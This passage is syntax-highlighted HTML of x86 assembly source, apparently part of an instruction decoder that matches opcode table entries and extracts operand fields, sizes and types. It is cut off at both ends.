</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">testentry</span><span class="sc0">                                       </span><span class="sc1">; of the table</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">                                 </span><span class="sc1">; go to next</span><span class="sc0">

</span><span class="sc5">detect5</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">tab@orignow</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">tab@orignow</span><span class="sc4">],</span><span class="sc2">7</span><span class="sc0">                   </span><span class="sc1">; save everything</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">                               </span><span class="sc1">; check end of </span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tab@skipprefix</span><span class="sc0">                                  </span><span class="sc1">; table</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">                                          </span><span class="sc1">; arrange stack</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">                                             </span><span class="sc1">; restore point.</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                                             </span><span class="sc1">; return -1</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                                                     </span><span class="sc1">; error code</span><span class="sc0">

</span><span class="sc5">testentry</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; nullify register buffer</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; nullify counter</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">tab@valcounter</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4size</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">                </span><span class="sc1">; get instruction size</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">dontdecit</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">; if it's 4, then it should</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4size</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">                </span><span class="sc1">; be 3 (there's no &gt; 3 bytes)</span><span class="sc0">

</span><span class="sc5">dontdecit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                                 </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">tab@makeloop1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                  </span><span class="sc1">; load the binary</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                  </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">; load next entry</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">tab@makeloop1</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tab@dondonet</span><span class="sc0">                            </span><span class="sc1">; if size was three</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">                                  </span><span class="sc1">; put the last part</span><span class="sc0">

</span><span class="sc5">tab@dondonet</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tab@skipfoundit</span><span class="sc0">                                 </span><span class="sc1">; skip analyzing</span><span class="sc0">
                                                        </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4oper</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">; nullify flags</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4mem</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">011b</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getvalb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4oper</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">            </span><span class="sc1">; o type</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">01b</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getvalb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4word</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">            </span><span class="sc1">; w type</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0111b</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getvalb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4mem</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">             </span><span class="sc1">; m type</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0111b</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getvalb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4reg</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">             </span><span class="sc1">; r type</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0111b</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getvalb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4seg</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">             </span><span class="sc1">; s type</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">01111b</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getvalb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4cond</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">            </span><span class="sc1">; c type</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tab@wefoundit</span><span class="sc0">                                   </span><span class="sc1">; is it okay</span><span class="sc0">

</span><span class="sc5">tab@skipfoundit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                                             </span><span class="sc1">; restore eax</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">getvalb</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">11111b</span><span class="sc0">                              </span><span class="sc1">; see flags location</span><span class="sc0">

</span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc2">5</span><span class="sc0">                       </span><span class="sc1">; load next location in flag</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tab@nullskip0</span><span class="sc0">                           </span><span class="sc1">; if zero, dont apply</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                                 </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc5">tab@doitagain</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                                   </span><span class="sc1">; shift bit to big endian</span><span class="sc0">
                                                </span><span class="sc1">; and shift of the size</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">; bit length size</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">tab@doitagain</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">                                  </span><span class="sc1">; pass to big endian</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">

</span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                                  </span><span class="sc1">; go to the pos.</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                                 </span><span class="sc1">; nullify it</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">; save it</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                                   </span><span class="sc1">; and then come back</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">doitagainp</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                                   </span><span class="sc1">; go to next</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">doitagainp</span><span class="sc0">                              </span><span class="sc1">; watch it</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                                     </span><span class="sc1">; return with eax = value</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">tab@nullskip0</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; finish it</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                                   </span><span class="sc1">; return with -1</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">tab@wefoundit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4clean</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; save the clean instruction</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                         </span><span class="sc1">; restore stack</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4taboff</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4taboff</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">            </span><span class="sc1">; save the instruction</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4taboff</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4insoff</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; fix up instruction off</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4opoff</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; and operation offset</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">tab@orignow</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; load attrib fixed</span><span class="sc0">

</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4size</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; get instruction size</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; add to ebp</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4argum</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">; load 1st argument</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getoperand</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; load 2nd argument</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4argum2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getoperand</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4offset</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; render instruction size</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                                 </span><span class="sc1">; now</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">t4size</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">getoperand</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">thatnotme0</span><span class="sc0">                              </span><span class="sc1">; check if arg is null</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argtype</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">thatnotme0</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argtype</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">; set as register</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">AccWord</span><span class="sc0">                              </span><span class="sc1">; pay attention to </span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">notAcc</span><span class="sc0">                                  </span><span class="sc1">; accumulators</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">; set the size</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">Acc</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getother</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">                                      </span><span class="sc1">; size is may be 8 bit</span><span class="sc0">

</span><span class="sc5">getother</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getsize</span><span class="sc0">                                 </span><span class="sc1">; load the register size</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argsize</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">             </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argextreg</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">notAcc</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">DX0</span><span class="sc0">                                  </span><span class="sc1">; check if we have DX</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notDX0</span><span class="sc0">                  </span><span class="sc1">; as ex OUT </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">t4argsize</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
